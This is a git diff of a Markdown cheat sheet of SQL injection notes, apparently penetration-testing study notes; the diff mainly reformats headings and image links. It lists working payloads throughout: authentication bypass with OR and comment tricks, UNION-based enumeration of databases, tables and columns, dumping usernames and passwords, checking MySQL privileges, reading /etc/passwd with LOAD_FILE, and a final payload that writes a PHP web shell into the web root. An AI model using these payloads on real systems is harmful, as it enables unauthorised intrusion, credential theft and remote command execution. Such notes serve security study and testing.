@@ -1,10 +1,10 @@
 # SQL Injections
 
-# SQL Injections Payload
+## SQL Injections Payload
 
 [PayloadsAllTheThings/SQL Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
 
-# **SQLi Discovery**
+## **SQLi Discovery**
 
 | Payload | URL Encoded |
 | --- | --- |
@@ -14,7 +14,7 @@
 | `;` | `%3B` |
 | `)` | `%29` |
 
-# **OR Injection**
+## **OR Injection**
 
 **Payload**
 
@@ -30,7 +30,7 @@ SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something
 
 ![image.png](../../Images/sqli_image1.png)
 
-# **Comments**
+## **Comments**
 
 ```sql
 mysql> SELECT username FROM logins; -- 
@@ -42,7 +42,7 @@ The `#` symbol can be used as well.
 
 **Note:** if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
 
-## **Comments to SQLi**
+### **Comments to SQLi**
 
 **Original Query**
 
@@ -62,11 +62,11 @@ admin'— -
 SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
 ```
 
-# **Union Injection**
+## **Union Injection**
 
-## **Detect number of columns**
+### **Detect number of columns**
 
-### **Using ORDER BY**
+#### **Using ORDER BY**
 
 In SQL, `ORDER BY x` is used to sort the results of a query based on the x column selected in the list of columns.
 
@@ -79,7 +79,7 @@ In SQL, `ORDER BY x` is used to sort the results of a query based on the x colum
 
 **Note:** If it failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfully.
 
-### **Using UNION**
+#### **Using UNION**
 
 ```
 cn' UNION select NULL-- -                 #The used SELECT statements have a different number of columns
@@ -90,19 +90,19 @@ cn' UNION select NULL,NULL,NULL,NULL-- -  #The used SELECT statements have a dif
 
 We get an error saying that the number of columns don’t match.
 
-## **Location of Injection**
+### **Location of Injection**
 
-```sql
+```
 cn' UNION select 'a',NULL,NULL-- -
 cn' UNION select NULL,'a',NULL-- -
 cn' UNION select NULL,NULL,'a'-- -
 ```
 
-In this case, the payload can be injected in column 2, 3.
+In this example case, the payload can be injected in column 2, 3.
 
-# **Database Enumeration**
+## **Database Enumeration**
 
-## **MySQL Fingerprinting**
+### **MySQL Fingerprinting**
 
  The following queries and their output will tell us that we are dealing with `MySQL`:
 
@@ -112,7 +112,7 @@ In this case, the payload can be injected in column 2, 3.
 | `SELECT POW(1,1)` | When we only have numeric output | `1` | Error with other DBMS |
 | `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |
 
-## Database, Tables and Column Enumeration
+### Database, Tables and Column Enumeration
 
 > The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.
 > 
@@ -123,41 +123,41 @@ In this case, the payload can be injected in column 2, 3.
 > The `SCHEMA_NAME` column contains all the database names currently present.
 > 
 
-**Payload**
+#### **Payload**
 
 ```sql
 cn' UNION select NULL,'a',NULL-- -
 ```
 
-**Enumerating database**
+#### **Enumerating database**
 
 ```sql
 cn' UNION select NULL,schema_name,NULL from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-**Find out which database the web application is running**
+#### **Find out which database the web application is running**
 
 ```sql
 cn' UNION select NULL,database(),NULL from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-**TABLES**
+#### **Tables**
 
 ```sql
 cn' UNION select NULL,TABLE_NAME,TABLE_SCHEMA,NULL from INFORMATION_SCHEMA.TABLES where table_schema='<DATABASE_NAME>'-- -
 ```
 
-**Note: W**e added a (where table_schema='') condition to only return tables from the specified' database, otherwise we would get all tables in all databases, which can be many.
+**Note**: We added a (where table_schema='') condition to only return tables from the specified' database, otherwise we would get all tables in all databases, which can be many.
 
-**COLUMNS**
+#### **Columns**
 
 ```sql
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE_NAME>'-- -
 ```
 
-**DATA**
+#### **DATA**
 
-```sql
+```
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
 
@@ -181,41 +181,43 @@ SELECT user from mysql.user
 SELECT super_priv FROM mysql.user
 ```
 
-**UNION payload example**
+#### **UNION payload example**
 
-```sql
+```
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 ```
 
 If the query returns `Y`, it means `YES`, indicating superuser privileges. 
 
-**Check more privileges**
+### **Check more privileges**
 
-```sql
+```
 cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
 ```
 
 ![image.png](../../Images/sqli_image2.png)
 
-### **LOAD_FILE**
+## **LOAD_FILE**
 
-```sql
+```
 SELECT LOAD_FILE('/etc/passwd');
 ```
 
-**UNION payload example**
+#### **UNION payload example**
 
 ```sql
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 ```
 
-**Another Example**
+#### **Another Example**
 
 In this example know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.
 
- **HTML source:**
+ 
 
-![image.png](SQL%20Injections%2013166046cc148077aa8ee70528dfedcc/image%202.png)
+
+![image.png](../../Images/sqli_image3.png)
+
 
 ### **Write File Privileges**
 
@@ -233,17 +235,17 @@ An empty value lets us read files from the entire file system. Otherwise, if a c
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
-**UNION payload example**
+#### **UNION payload example**
 
 ```sql
 SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 ```
 
-**SELECT INTO OUTFILE**
+### **SELECT INTO OUTFILE**
 
 The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
 
-**Example**
+#### **Example**
 
 ```sql
 SELECT * from users INTO OUTFILE '/tmp/credentials';    #COPY users Table content to /tmp/credentials
@@ -254,7 +256,7 @@ SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';   #COPY string into a file
 
 **Note:** Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
 
-## **Writing a Web Shell**
+#### **Writing a Web Shell**
 
 ```sql
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
